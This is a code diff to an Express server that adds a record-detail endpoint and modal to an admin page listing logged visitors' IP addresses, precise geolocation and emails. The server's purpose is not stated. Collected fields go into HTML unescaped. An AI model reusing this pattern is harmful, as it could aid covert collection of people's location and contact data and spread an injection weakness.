@@ -3,7 +3,7 @@ const cors = require('cors');
 const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
-const cookieParser = require('cookie-parser');  // ADDED
+const cookieParser = require('cookie-parser');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -17,14 +17,9 @@ let lastData = null;
 app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true }));
-app.use(cookieParser());  // ADDED
+app.use(cookieParser());
 app.use(express.static(path.join(__dirname)));
 
-// ... rest of your routes (same as before) ...
-// Ensure all routes are identical to the previously provided server.js
-// but with the cookie parser added.
-
-// I'll include the full code again for completeness:
 function generateToken() {
     return crypto.randomBytes(16).toString('hex');
 }
@@ -99,6 +94,18 @@ app.post('/login', (req, res) => {
     }
 });
 
+// Endpoint to get a single record's full payload as JSON
+app.get('/record/:id', (req, res) => {
+    if (!isAuthenticated(req)) {
+        return res.status(401).json({ error: 'Unauthorized' });
+    }
+    const id = parseInt(req.params.id);
+    if (isNaN(id) || id < 0 || id >= logHistory.length) {
+        return res.status(404).json({ error: 'Record not found' });
+    }
+    res.json(logHistory[id]);
+});
+
 app.get('/admin', (req, res) => {
     if (!isAuthenticated(req)) {
         return res.redirect('/login');
@@ -115,7 +122,7 @@ app.get('/admin', (req, res) => {
             const location = p.location ? `${p.location.latitude}, ${p.location.longitude} (acc: ${p.location.accuracy}m)` : 'Not shared';
             const email = p.email || p.nick || '—';
             const time = new Date(entry.received_at).toLocaleString();
-            rows += `<tr>
+            rows += `<tr onclick="viewRecord(${index})" style="cursor:pointer;">
                 <td>${index + 1}</td>
                 <td>${time}</td>
                 <td>${ip}</td>
@@ -142,6 +149,43 @@ app.get('/admin', (req, res) => {
         tr:hover { background: #f0f4ff; }
         .logout { margin-top: 20px; }
         .logout a { color: #1a73e8; text-decoration: none; }
+
+        /* Modal styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0; top: 0;
+            width: 100%; height: 100%;
+            overflow: auto;
+            background-color: rgba(0,0,0,0.5);
+        }
+        .modal-content {
+            background-color: white;
+            margin: 5% auto;
+            padding: 20px;
+            border-radius: 12px;
+            width: 80%;
+            max-width: 800px;
+            max-height: 80%;
+            overflow-y: auto;
+            box-shadow: 0 4px 30px rgba(0,0,0,0.3);
+        }
+        .close {
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .close:hover { color: #999; }
+        .modal pre {
+            background: #f5f7fa;
+            padding: 15px;
+            border-radius: 8px;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-size: 13px;
+        }
     </style>
 </head>
 <body>
@@ -163,8 +207,41 @@ app.get('/admin', (req, res) => {
             ${rows}
         </tbody>
     </table>
-    <div class="footer" style="margin-top:20px; font-size:13px; color:#999;">Data is stored in memory. Use "Logout" to end session.</div>
+    <div class="footer" style="margin-top:20px; font-size:13px; color:#999;">Click on a row to view full data.</div>
 </div>
+
+<!-- Modal -->
+<div id="recordModal" class="modal">
+    <div class="modal-content">
+        <span class="close" onclick="closeModal()">&times;</span>
+        <h3>Full Record Details</h3>
+        <pre id="modalPayload">Loading...</pre>
+    </div>
+</div>
+
+<script>
+    function viewRecord(id) {
+        fetch('/record/' + id)
+            .then(res => res.json())
+            .then(data => {
+                document.getElementById('modalPayload').textContent = JSON.stringify(data, null, 2);
+                document.getElementById('recordModal').style.display = 'block';
+            })
+            .catch(err => {
+                alert('Error loading record: ' + err);
+            });
+    }
+    function closeModal() {
+        document.getElementById('recordModal').style.display = 'none';
+    }
+    // Close modal when clicking outside the content
+    window.onclick = function(event) {
+        const modal = document.getElementById('recordModal');
+        if (event.target == modal) {
+            modal.style.display = 'none';
+        }
+    }
+</script>
 </body>
 </html>`;
     res.send(html);
@@ -179,7 +256,6 @@ app.get('/logout', (req, res) => {
     res.redirect('/login');
 });
 
-// Legacy endpoints
 app.get('/records', (req, res) => {
     if (isAuthenticated(req)) {
         return res.redirect('/admin');
